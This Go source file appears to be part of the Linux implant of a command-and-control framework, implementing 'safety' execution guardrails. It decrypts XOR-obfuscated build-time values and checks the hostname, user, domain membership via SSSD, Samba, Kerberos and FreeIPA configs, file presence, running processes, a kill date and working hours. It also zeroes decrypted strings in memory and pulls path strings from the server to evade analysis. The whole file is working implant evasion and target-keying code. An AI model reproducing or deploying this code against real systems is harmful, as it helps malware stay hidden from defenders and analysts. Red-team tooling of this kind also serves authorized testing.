// server/docker/payloads/Linux/exec_requirements_linux.go
//go:build linux
// +build linux

package main

import (
	"bufio"
	"encoding/base64"
	"fmt"
	"os"
	"os/user"
	"path/filepath"
	"strings"
	"time"
	"unsafe"

	"github.com/shirou/gopsutil/v3/process"
)

// Build-time variables that will be set via ldflags (XOR encrypted)
var (
	// Safety check variables - set at build time (XOR encrypted with xorKey)
	safetyHostname       string = ""
	safetyUsername       string = ""
	safetyDomain         string = ""
	safetyFilePath       string = ""
	safetyFileMustExist  string = "false"
	safetyProcess        string = ""
	safetyKillDate       string = ""
	safetyWorkHoursStart string = ""
	safetyWorkHoursEnd   string = ""
)

// decryptSafetyValue decrypts a XOR-encrypted safety value
func decryptSafetyValue(encrypted string) string {
	if encrypted == "" {
		return ""
	}
	decoded, err := base64.StdEncoding.DecodeString(encrypted)
	if err != nil {
		return ""
	}
	result := make([]byte, len(decoded))
	for i := 0; i < len(decoded); i++ {
		result[i] = decoded[i] ^ xorKey[i%len(xorKey)]
	}
	return string(result)
}

// clearString overwrites string memory to prevent recovery
func clearString(s *string) {
	if s == nil || *s == "" {
		return
	}
	// Get pointer to string header
	hdr := (*struct {
		Data uintptr
		Len  int
	})(unsafe.Pointer(s))
	if hdr.Data == 0 || hdr.Len == 0 {
		return
	}
	// Clear the backing array
	for i := 0; i < hdr.Len; i++ {
		*(*byte)(unsafe.Pointer(hdr.Data + uintptr(i))) = 0
	}
	*s = ""
}

// ExecReqTemplate stores exec requirements template strings received from server
type ExecReqTemplate struct {
	Version   int      `json:"v"`
	Type      int      `json:"t"`
	Templates []string `json:"tpl"`
	Params    []string `json:"p"`
}

// Exec requirements template indices - must match server's common.go
const (
	idxExecReqPathEtcHostname = 300
	idxExecReqPathSssdConf    = 301
	idxExecReqPathSmbConf     = 302
	idxExecReqPathKrb5Conf    = 303
	idxExecReqPathIpaConf     = 304
	idxExecReqPathProc        = 305
	idxExecReqPathTildeFwd    = 306
	idxExecReqEnvUser         = 307
	idxExecReqEnvLogname      = 308
	idxExecReqPatternDomainsEq  = 309
	idxExecReqPatternDomainsEq2 = 310
	idxExecReqPatternWorkgroup  = 311
	idxExecReqPatternRealm      = 312
	idxExecReqPatternDefRealm   = 313
	idxExecReqPatternDomainEq   = 314
	idxExecReqPatternDomainEq2  = 315
	idxExecReqProcCmdline       = 316
	idxExecReqProcComm          = 317
	idxExecReqWordTrue          = 318
	idxExecReqTimeFmtFull       = 319
	idxExecReqEnvHostname       = 320
	idxExecReqEnvShell          = 321

	// System info strings (for getSystemInfo.go)
	idxExecReqSysInfoStartupTime  = 322
	idxExecReqSysInfoStatusActive = 323
)

// Global exec req template storage (uses SecureTemplate for memory zeroing)
var globalExecReqTpl *SecureTemplate

// setExecReqTemplate stores the exec requirements template (converts to SecureTemplate)
func setExecReqTemplate(tpl *ExecReqTemplate) {
	// Zero old template before replacing
	if globalExecReqTpl != nil {
		globalExecReqTpl.Zero()
	}
	globalExecReqTpl = NewSecureTemplateFromSlices(tpl.Version, tpl.Type, tpl.Templates, tpl.Params)
}

// erTpl safely retrieves a template string by index
func erTpl(idx int) string {
	return globalExecReqTpl.Get(idx)
}

// getErStr gets exec req string from template (no fallbacks - templates sent during handshake)
func getErStr(idx int) string {
	return erTpl(idx)
}

// PerformSafetyChecks runs all configured safety checks
// Returns true if all checks pass, false otherwise
// Safety values are XOR encrypted - decrypt, compare, then clear from memory
func PerformSafetyChecks() bool {
	// If no safety checks are configured, allow execution
	if !hasSafetyChecks() {
		return true
	}

	// Check hostname (decrypt, compare, clear)
	if safetyHostname != "" {
		expected := decryptSafetyValue(safetyHostname)
		result := checkHostname(expected)
		clearString(&expected)
		if !result {
			return false
		}
	}

	// Check username (decrypt, compare, clear)
	if safetyUsername != "" {
		expected := decryptSafetyValue(safetyUsername)
		result := checkUsername(expected)
		clearString(&expected)
		if !result {
			return false
		}
	}

	// Check domain (decrypt, compare, clear)
	if safetyDomain != "" {
		expected := decryptSafetyValue(safetyDomain)
		result := checkDomain(expected)
		clearString(&expected)
		if !result {
			return false
		}
	}

	// Check file existence (decrypt, compare, clear)
	if safetyFilePath != "" {
		path := decryptSafetyValue(safetyFilePath)
		mustExistVal := decryptSafetyValue(safetyFileMustExist)
		mustExist := mustExistVal == getErStr(idxExecReqWordTrue)
		result := checkFile(path, mustExist)
		clearString(&path)
		clearString(&mustExistVal)
		if !result {
			return false
		}
	}

	// Check process (decrypt, compare, clear)
	if safetyProcess != "" {
		expected := decryptSafetyValue(safetyProcess)
		result := checkProcess(expected)
		clearString(&expected)
		if !result {
			return false
		}
	}

	// Check kill date (decrypt, compare, clear)
	if safetyKillDate != "" {
		expected := decryptSafetyValue(safetyKillDate)
		result := checkKillDate(expected)
		clearString(&expected)
		if !result {
			return false
		}
	}

	// Check working hours (decrypt, compare, clear)
	if safetyWorkHoursStart != "" && safetyWorkHoursEnd != "" {
		start := decryptSafetyValue(safetyWorkHoursStart)
		end := decryptSafetyValue(safetyWorkHoursEnd)
		result := checkWorkingHours(start, end)
		clearString(&start)
		clearString(&end)
		if !result {
			return false
		}
	}

	return true
}

// hasSafetyChecks returns true if any safety checks are configured
func hasSafetyChecks() bool {
	return safetyHostname != "" ||
		safetyUsername != "" ||
		safetyDomain != "" ||
		safetyFilePath != "" ||
		safetyProcess != "" ||
		safetyKillDate != "" ||
		(safetyWorkHoursStart != "" && safetyWorkHoursEnd != "")
}

// checkHostname verifies the system hostname matches the expected value
func checkHostname(expected string) bool {
	hostname, err := os.Hostname()
	if err != nil {
		return false
	}

	// Also check /etc/hostname as a fallback
	if !strings.EqualFold(hostname, expected) {
		if data, err := os.ReadFile(getErStr(idxExecReqPathEtcHostname)); err == nil {
			hostname = strings.TrimSpace(string(data))
		}
	}

	// Case-insensitive comparison
	return strings.EqualFold(hostname, expected)
}

// checkUsername verifies the current username matches the expected value
func checkUsername(expected string) bool {
	currentUser, err := user.Current()
	if err != nil {
		// Fallback to environment variable
		username := os.Getenv(getErStr(idxExecReqEnvUser))
		if username == "" {
			username = os.Getenv(getErStr(idxExecReqEnvLogname))
		}
		return strings.EqualFold(username, expected)
	}

	// Case-insensitive comparison
	return strings.EqualFold(currentUser.Username, expected)
}

// checkDomain checks if the system is joined to a domain
func checkDomain(expected string) bool {
	// Check SSSD configuration
	if domain := checkSSSDDomain(); domain != "" {
		if strings.EqualFold(domain, expected) {
			return true
		}
	}

	// Check Samba/Winbind
	if domain := checkSambaDomain(); domain != "" {
		if strings.EqualFold(domain, expected) {
			return true
		}
	}

	// Check Kerberos realm
	if realm := checkKerberosRealm(); realm != "" {
		if strings.EqualFold(realm, expected) {
			return true
		}
	}

	// Check FreeIPA
	if domain := checkFreeIPADomain(); domain != "" {
		if strings.EqualFold(domain, expected) {
			return true
		}
	}

	return false
}

// checkSSSDDomain checks SSSD configuration for domain membership
func checkSSSDDomain() string {
	file, err := os.Open(getErStr(idxExecReqPathSssdConf))
	if err != nil {
		return ""
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if strings.HasPrefix(line, getErStr(idxExecReqPatternDomainsEq)) || strings.HasPrefix(line, getErStr(idxExecReqPatternDomainsEq2)) {
			parts := strings.Split(line, "=")
			if len(parts) > 1 {
				domain := strings.TrimSpace(parts[1])
				// Return first domain if multiple
				if strings.Contains(domain, ",") {
					domains := strings.Split(domain, ",")
					return strings.TrimSpace(domains[0])
				}
				return domain
			}
		}
	}

	return ""
}

// checkSambaDomain checks Samba configuration for domain membership
func checkSambaDomain() string {
	file, err := os.Open(getErStr(idxExecReqPathSmbConf))
	if err != nil {
		return ""
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		lineLower := strings.ToLower(line)

		// Look for "workgroup = DOMAIN" or "realm = domain.com"
		if strings.HasPrefix(lineLower, getErStr(idxExecReqPatternWorkgroup)) || strings.HasPrefix(lineLower, getErStr(idxExecReqPatternRealm)) {
			if strings.Contains(line, "=") {
				parts := strings.Split(line, "=")
				if len(parts) > 1 {
					return strings.TrimSpace(parts[1])
				}
			}
		}
	}

	return ""
}

// checkKerberosRealm checks for Kerberos configuration
func checkKerberosRealm() string {
	file, err := os.Open(getErStr(idxExecReqPathKrb5Conf))
	if err != nil {
		return ""
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if strings.HasPrefix(strings.ToLower(line), getErStr(idxExecReqPatternDefRealm)) {
			if strings.Contains(line, "=") {
				parts := strings.Split(line, "=")
				if len(parts) > 1 {
					return strings.TrimSpace(parts[1])
				}
			}
		}
	}

	return ""
}

// checkFreeIPADomain checks for FreeIPA/IdM domain membership
func checkFreeIPADomain() string {
	// Check /etc/ipa/default.conf
	file, err := os.Open(getErStr(idxExecReqPathIpaConf))
	if err != nil {
		return ""
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if strings.HasPrefix(line, getErStr(idxExecReqPatternDomainEq)) || strings.HasPrefix(line, getErStr(idxExecReqPatternDomainEq2)) {
			parts := strings.Split(line, "=")
			if len(parts) > 1 {
				return strings.TrimSpace(parts[1])
			}
		}
	}

	return ""
}

// checkFile verifies file existence based on the requirement
func checkFile(path string, mustExist bool) bool {
	// Expand ~ to home directory if present
	if strings.HasPrefix(path, getErStr(idxExecReqPathTildeFwd)) {
		if home, err := os.UserHomeDir(); err == nil {
			path = filepath.Join(home, path[2:])
		}
	}

	_, err := os.Stat(path)

	if mustExist {
		// File must exist - check passes if no error
		return err == nil
	} else {
		// File must NOT exist - check passes if error (file not found)
		return os.IsNotExist(err)
	}
}

// checkProcess checks if a specific process is running
func checkProcess(processName string) bool {
	// First try the /proc filesystem approach
	if checkProcessViaProc(processName) {
		return true
	}

	// Fallback to gopsutil
	return checkProcessGopsutil(processName)
}

// checkProcessViaProc checks for process via /proc filesystem
func checkProcessViaProc(processName string) bool {
	entries, err := os.ReadDir(getErStr(idxExecReqPathProc))
	if err != nil {
		return false
	}

	for _, entry := range entries {
		// Skip non-PID directories
		if !entry.IsDir() {
			continue
		}

		// Check if directory name is a PID (all digits)
		pid := entry.Name()
		isPID := true
		for _, char := range pid {
			if char < '0' || char > '9' {
				isPID = false
				break
			}
		}

		if !isPID {
			continue
		}

		// Read the cmdline file to get process name
		cmdlinePath := filepath.Join(getErStr(idxExecReqPathProc), pid, getErStr(idxExecReqProcCmdline))
		cmdlineBytes, err := os.ReadFile(cmdlinePath)
		if err != nil {
			continue
		}

		// Convert null-separated cmdline to string
		cmdline := string(cmdlineBytes)
		cmdline = strings.ReplaceAll(cmdline, "\x00", " ")

		// Check if process name matches
		if strings.Contains(strings.ToLower(cmdline), strings.ToLower(processName)) {
			return true
		}

		// Also check comm file for just the process name
		commPath := filepath.Join(getErStr(idxExecReqPathProc), pid, getErStr(idxExecReqProcComm))
		commBytes, err := os.ReadFile(commPath)
		if err != nil {
			continue
		}

		comm := strings.TrimSpace(string(commBytes))
		if strings.EqualFold(comm, processName) {
			return true
		}
	}

	return false
}

// checkProcessGopsutil uses gopsutil as fallback for process checking
func checkProcessGopsutil(processName string) bool {
	processes, err := process.Processes()
	if err != nil {
		return false
	}

	for _, p := range processes {
		name, err := p.Name()
		if err != nil {
			continue
		}

		// Check both exact name and if the process name is contained
		if strings.EqualFold(name, processName) {
			return true
		}

		// Also check command line
		cmdline, err := p.Cmdline()
		if err == nil && strings.Contains(strings.ToLower(cmdline), strings.ToLower(processName)) {
			return true
		}
	}

	return false
}

// checkKillDate verifies the current date is before the kill date
func checkKillDate(killDateStr string) bool {
	// Parse kill date (format: "2006-01-02 15:04:05")
	killDate, err := time.Parse(getErStr(idxExecReqTimeFmtFull), killDateStr)
	if err != nil {
		// If we can't parse the kill date, fail safe and don't run
		return false
	}

	// Check if current time is before kill date
	return time.Now().Before(killDate)
}

// checkWorkingHours verifies the current time is within working hours
func checkWorkingHours(startTime, endTime string) bool {
	now := time.Now()

	// Parse start time (format: "HH:MM")
	startParts := strings.Split(startTime, ":")
	if len(startParts) != 2 {
		return false
	}

	var startHour, startMin int
	fmt.Sscanf(startParts[0], "%d", &startHour)
	fmt.Sscanf(startParts[1], "%d", &startMin)

	// Parse end time
	endParts := strings.Split(endTime, ":")
	if len(endParts) != 2 {
		return false
	}

	var endHour, endMin int
	fmt.Sscanf(endParts[0], "%d", &endHour)
	fmt.Sscanf(endParts[1], "%d", &endMin)

	// Create time objects for today with specified hours
	startToday := time.Date(now.Year(), now.Month(), now.Day(), startHour, startMin, 0, 0, now.Location())
	endToday := time.Date(now.Year(), now.Month(), now.Day(), endHour, endMin, 0, 0, now.Location())

	// Check if current time is within range
	return now.After(startToday) && now.Before(endToday)
}
